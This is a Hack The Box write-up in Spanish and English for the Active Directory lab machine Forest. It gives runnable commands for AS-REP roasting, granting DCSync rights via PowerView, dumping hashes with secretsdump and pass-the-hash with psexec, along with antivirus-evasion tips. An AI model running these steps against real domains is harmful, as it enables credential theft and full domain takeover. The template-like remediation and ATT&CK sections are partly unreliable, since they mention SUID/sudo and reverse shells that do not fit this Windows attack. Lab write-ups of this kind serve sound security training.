---
title: "Informe Técnico: Forest (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Forest de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Forest

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Forest** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** AS-REP Roasting (svc-alfresco, Kerberos Pre-Auth disabled)
* **Vector de Elevación de Privilegios:** WriteDACL abuse (Exchange Windows Permissions) -> DCSync -> PtH
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Forest |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Easy |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | AS-REP Roasting (svc-alfresco, Kerberos Pre-Auth disabled) |
| **Mecanismo de Escalada** | WriteDACL abuse (Exchange Windows Permissions) -> DCSync -> PtH |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: AS-REP Roasting (svc-alfresco, Kerberos Pre-Auth disabled)
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: WriteDACL abuse (Exchange Windows Permissions) -> DCSync -> PtH
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

CVE(s): N/A
GTFOBins/Abusos (sudo/SUID): N/A (AD ACL abuse)
Initial Access Exploit (Ingreso): AS-REP Roasting (svc-alfresco, Kerberos Pre-Auth disabled)

Privilege Escalation (Escalada): WriteDACL abuse (Exchange Windows Permissions) -> DCSync -> PtH



| Field | Detail |
| --- | --- |
| Name | Forest |
| OS | Windows Server 2016 (Domain Controller) |
| Difficulty | Easy |
| CVE | N/A |
| Initial Access | AS-REP Roasting (Kerberos Pre-Auth disabled) |
| Privilege Escalation | WriteDACL abuse via Exchange Windows Permissions -> DCSync |

---

## Reconnaissance

An Nmap scan identifies this machine as a Domain Controller for the `htb.local` domain, with common AD services exposed: DNS (53), Kerberos (88), LDAP (389), SMB (445), and WinRM (5985).

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_01.png)

## Enumeration

LDAP allows anonymous authentication, enabling enumeration of all domain users and groups. Among the discovered accounts, `svc-alfresco` (a service account for the Alfresco content management system) has Kerberos Pre-Authentication disabled, making it vulnerable to AS-REP Roasting.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_02.png)

## Exploitation

Using Impacket's `GetNPUsers`, an AS-REP hash is requested for `svc-alfresco` without needing credentials:

```
impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161
impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass -request -format hashcat -outputfile asrep.hash
```

The AS-REP hash is cracked offline with Hashcat, revealing the password: `s3rvice`.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_03.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_04.png)

With valid credentials, WinRM (port 5985) provides an interactive shell using Evil-WinRM.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_05.png)

## Flags

### User Flag (svc-alfresco)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_06.png)

## Privilege Escalation

BloodHound analysis reveals that the `Exchange Windows Permissions` group has **WriteDACL** permissions over the `HTB.LOCAL` domain object. This is a well-known misconfiguration introduced by Microsoft Exchange during installation.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_07.png)

The `svc-alfresco` account is a member of `Account Operators`, which grants the ability to add users to the `Exchange Windows Permissions` group. The attack chain is:

1. Create a new user and add it to `Exchange Windows Permissions`
2. Use WriteDACL to grant DCSync rights on the domain object
3. Perform DCSync to dump all NTLM hashes
4. Pass-the-Hash as Administrator

![Captura de pantalla 2025-08-15 130417.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_08.png)

The DCSync attack replicates directory changes (as a domain controller would), extracting the Administrator's NTLM hash. Using `impacket-psexec` with the hash grants a SYSTEM shell.

### Root Flag (Administrator)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_09.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_10.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_11.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/forest/images/step_12.png)

> 
> 
> 
> # Escalada por “Exchange Windows Permissions” → DCSync
> 
> ## ¿Qué detecta BloodHound?
> 
> Uno de los paths muestra que el grupo **Exchange Windows Permissions** tiene el permiso **WriteDACL** sobre el **objeto de dominio** `HTB.LOCAL`.
> 
> - **WriteDACL** = puede **modificar la ACL** del objeto (añadir entradas).
> - Si añadimos una ACE que conceda **DCSync** (tres derechos extendidos de replicación) a un usuario nuestro, podremos **replicar secretos** del AD (NTDS) como si fuésemos un DC.
> 
> > DCSync implica:
> > 
> > 
> > `Replicating Directory Changes`, `Replicating Directory Changes All` y `Replicating Directory Changes In Filtered Set` sobre el **objeto de dominio**.
> > 
> 
> ---
> 
> ## Pasos prácticos (desde WinRM)
> 
> 1. **Crear usuario “john”** y meterlo en los grupos necesarios
>     
>     (EWP para poder cambiar la ACL del dominio; Remote Management Users para poder usar WinRM con él si hace falta):
>     
> 
> ```powershell
> net user john abc123! /add /domain
> net group "Exchange Windows Permissions" john /add
> net localgroup "Remote Management Users" john /add
> 
> ```
> 
> 1. **Cargar PowerView** (para manipular ACLs con comodidad):
> 
> ```powershell
> # Subir PowerView.ps1 y cargarlo
> # (ejemplo, ya cargado desde Evil-WinRM)
> . .\PowerView.ps1
> 
> ```
> 
> 1. **Conceder DCSync a “john”** en el objeto de dominio
>     
>     Usamos credenciales de **john** para que su token ya incluya EWP (evita esperar al refresco de token):
>     
> 
> ```powershell
> $pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
> $cred = New-Object System.Management.Automation.PSCredential('HTB\john',$pass)
> 
> # Identificador del dominio (DN)
> $DomainDN = (Get-Domain).DistinguishedName   # ej: "DC=htb,DC=local"
> 
> # Añadir DCSync (PowerView agrega las 3 ACE necesarias)
> Add-ObjectACL -TargetIdentity $DomainDN -PrincipalIdentity 'john' -Rights DCSync -Credential $cred -Verbose
> 
> ```
> 
> > Verificación (opcional):
> > 
> 
> ```powershell
> Get-ObjectAcl -DistinguishedName $DomainDN -ResolveGUIDs | ? {$_.IdentityReference -match '^HTB\\john$' -and $_.ActiveDirectoryRights -match 'ExtendedRight'}
> 
> ```
> 
> 1. **DCSync con Impacket** (desde Kali) usando la cuenta “john”:
> 
> ```bash
> impacket-secretsdump 'htb.local/john:abc123!@10.10.10.161'
> # → obtendrás los NTLM (incluido Administrator)
> 
> ```
> 
> > Si ves un aviso tipo RemoteOperations failed: ... access_denied pero a continuación Using the DRSUAPI method… y te saca los hashes, el DCSync ha funcionado.
> > 
> 1. **Abusar del hash de Administrator** para RCE (psexec):
> 
> ```bash
> impacket-psexec administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:<NTLM_ADMIN>'
> 
> ```
> 
> Con la shell de admin, lee la flag:
> 
> ```bash
> type C:\Users\Administrator\Desktop\root.txt
> 
> ```
> 
> ---
> 
> ## Por qué funciona
> 
> - **EWP** (creado por Exchange) está **mal delegado** con **WriteDACL** sobre el dominio.
> - Cualquier miembro de EWP puede **añadir ACEs** al objeto de dominio → **otorgarse DCSync**.
> - Con DCSync podemos **replicar** secretos de AD (como lo haría un DC) y obtener **hashes** de todas las cuentas.
> 
> ---
> 
> ## Problemas comunes y cómo evitaros
> 
> - **El token no incluye EWP aún**: usa `Credential $cred` de **john** al llamar a `Add-ObjectACL` (así se autentica nuevo y hereda el grupo).
> - **Objetivo equivocado**: asegúrate de pasar `TargetIdentity (Get-Domain).DistinguishedName` (el **objeto de dominio**), no el DC (equipo).
> - **AV bloquea PowerView**: renómbralo o usa versión “minificada”; como alternativa, `Add-DomainObjectAcl` de PowerSploit o `dacledit.py` (impacket).
> - **DCSync denegado**: confirma que ves las 3 ACEs de replicación para `HTB\john` en el ACL del dominio.
> 
> ---
> 
> ## Limpieza (si procede en el lab)
> 
> ```powershell
> # Quitar ACEs DCSync
> Remove-ObjectACL -TargetIdentity $DomainDN -PrincipalIdentity 'john' -Rights DCSync
> # Sacar de grupos y borrar user
> net group "Exchange Windows Permissions" john /del
> net localgroup "Remote Management Users" john /del
> net user john /del /domain
> 
> ```
>

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (AS-REP Roasting (svc-alfresco, Kerberos Pre-Auth disabled)) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (WriteDACL abuse (Exchange Windows Permissions) -> DCSync -> PtH) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
